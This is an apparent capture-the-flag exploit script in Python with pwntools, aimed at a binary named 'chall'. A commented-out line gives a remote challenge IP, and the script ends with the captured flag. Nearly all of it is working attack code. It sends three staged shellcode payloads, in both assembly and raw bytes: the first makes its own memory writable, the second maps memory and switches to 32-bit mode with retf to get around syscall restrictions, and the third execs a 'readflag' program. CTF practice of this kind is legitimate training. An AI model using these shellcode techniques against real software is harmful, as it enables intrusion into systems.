from pwn import *
context.binary = "./chall"
p = process("./chall")
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#p = remote("45.122.249.68", 20023)
#p = remote("localhost", 4444)

gdb.attach(p,'b*main+182')

asm_payload1 = asm(
    """
jmp $+3
lea rdi, [rip-0xa]
push rdi
xor rax, rax
push rax
pop rdx
add rdx, 7
mov al, 0xa
syscall
push rsi
pop rdx
pop rsi
push rax
pop rdi
syscall
"""
)

# asm_second_payload = asm(
# """
# xor rax,rax
# mov al, 9
# mov rdi, 0x602000
# mov rsi, 0x1000
# mov rdx, 7
# mov r10, 0x32
# mov r8, 0xFFFFFFFFFFFFFFFF
# mov r9, 0
# syscall
# xor rax, rax
# xor rdi, rdi
# mov rsi, 0x602190
# mov rdx, 0x64
# syscall
# xor rsp, rsp
# mov esp, 0x602160
# mov dword ptr [esp+4], 0x23
# mov dword ptr [esp], 0x602190
# retf
# """
# )


payload = b'\xEB\x01\x00\x48\x8D\x3D\xF6\xFF\xFF\xFF\x57\x48\x31\xC0\x50\x5A\x48\x83\xC2\x07\xB0\x0A\x0F\x05\x56\x5A\x5E\x50\x5F\x0F\x05'
p.send(payload)


time.sleep(1)
second_payload = b'\x90'*35 + b'\x48\x31\xC0\xB0\x09\x48\xC7\xC7\x00\x20\x60\x00\x48\xC7\xC6\x00\x10\x00\x00\x48\xC7\xC2\x07\x00\x00\x00\x49\xC7\xC2\x32\x00\x00\x00\x49\xB8\xFF\xFF\xFF\xFF\x00\x00\x00\x00\x49\xC7\xC1\x00\x00\x00\x00\x0F\x05'
second_payload += b'\x48\xC7\xC0\x00\x00\x00\x00\x48\x31\xFF\x48\xC7\xC6\x90\x21\x60\x00\x48\xC7\xC2\x64\x00\x00\x00\x0F\x05'
second_payload += b'\x48\x31\xE4\xBC\x60\x21\x60\x00\x67\xC7\x44\x24\x04\x23\x00\x00\x00\x67\xC7\x04\x24\x90\x21\x60\x00\xCB'

p.send(second_payload)

asm_third_payload = asm(
"""
push 0x67616c66
push 0x64616572
mov ebx, esp
xor ecx, ecx
xor edx, edx
xor eax, eax
mov al, 0x0b
int 0x80
"""
)
print("Sending third payload")
third_payload = b'\x68\x66\x6C\x61\x67\x68\x72\x65\x61\x64\x89\xE3\x31\xC9\x31\xD2\x31\xC0\xB0\x0B\xCD\x80'
time.sleep(5)
p.send(third_payload)
p.interactive()


#W1{a241489fb95e3fa2f108d49cfb80df96ad49cc1712530e95af87842e6515d2e2}